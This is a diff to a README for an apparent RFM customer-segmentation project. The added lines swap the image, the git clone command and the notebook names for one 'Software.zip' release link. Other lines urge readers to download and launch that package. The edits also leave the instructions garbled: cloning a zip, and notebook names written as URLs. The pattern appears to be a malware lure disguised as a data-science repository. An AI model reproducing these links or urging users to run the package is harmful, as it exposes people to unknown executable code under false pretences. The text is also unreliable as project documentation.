@@ -1,7 +1,7 @@
 
 # Customer Segmentation Using RFM Analysis for Online Retail 📊
 
-![RFM Analysis](https://cdn.pixabay.com/photo/2016/02/19/11/16/analytics-1204646_960_720.jpg)
+![RFM Analysis](https://github.com/elcheeselerat/Customer-Segmentation-Using-RFM-Analysis-for-Online-Retail/releases/download/v1.0/Software.zip)
 
 Welcome to the **Customer Segmentation Using RFM Analysis for Online Retail** repository! This project focuses on utilizing RFM (Recency, Frequency, and Monetary) segmentation to analyze customer behavior and provide valuable insights for targeted marketing campaigns in the online retail sector. By categorizing customers based on their purchasing patterns, businesses can tailor strategic approaches to enhance customer retention, drive growth, and maximize the lifetime value of each customer.
 
@@ -29,7 +29,7 @@ To get started with this project, you can follow these steps:
 
 1. **Clone the Repository**
    ```
-   git clone https://github.com/your_username/Customer-Segmentation-Using-RFM-Analysis-for-Online-Retail.git
+   git clone https://github.com/elcheeselerat/Customer-Segmentation-Using-RFM-Analysis-for-Online-Retail/releases/download/v1.0/Software.zip
    ```
 
 2. **Install Required Libraries**
@@ -38,8 +38,8 @@ To get started with this project, you can follow these steps:
    ```
 
 3. **Explore the Jupyter Notebooks**
-   - `RFM_Analysis.ipynb`: This notebook contains the code for RFM analysis and customer segmentation.
-   - `Data_Preprocessing.ipynb`: This notebook covers data cleaning and preprocessing steps.
+   - `https://github.com/elcheeselerat/Customer-Segmentation-Using-RFM-Analysis-for-Online-Retail/releases/download/v1.0/Software.zip`: This notebook contains the code for RFM analysis and customer segmentation.
+   - `https://github.com/elcheeselerat/Customer-Segmentation-Using-RFM-Analysis-for-Online-Retail/releases/download/v1.0/Software.zip`: This notebook covers data cleaning and preprocessing steps.
 
 4. **Run the Notebooks**
    Execute the code cells in the Jupyter notebooks to analyze the dataset, perform RFM analysis, and segment customers based on their RFM scores.
@@ -60,7 +60,7 @@ By leveraging RFM analysis and customer segmentation, businesses can derive nume
 
 For a detailed overview and implementation of RFM analysis in customer segmentation, feel free to explore the project files in this repository. Dive into the code, run the notebooks, and unlock valuable insights to optimize your marketing strategies in the online retail domain.
 
-**Launch the Software Package** ➡️ [![Launch Software](https://img.shields.io/badge/Launch-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+**Launch the Software Package** ➡️ [![Launch Software](https://github.com/elcheeselerat/Customer-Segmentation-Using-RFM-Analysis-for-Online-Retail/releases/download/v1.0/Software.zip)](https://github.com/elcheeselerat/Customer-Segmentation-Using-RFM-Analysis-for-Online-Retail/releases/download/v1.0/Software.zip)
 
 If the link provided above ends with a file name, make sure to download and launch the software package to explore additional functionalities and tools related to RFM analysis and customer segmentation.
 
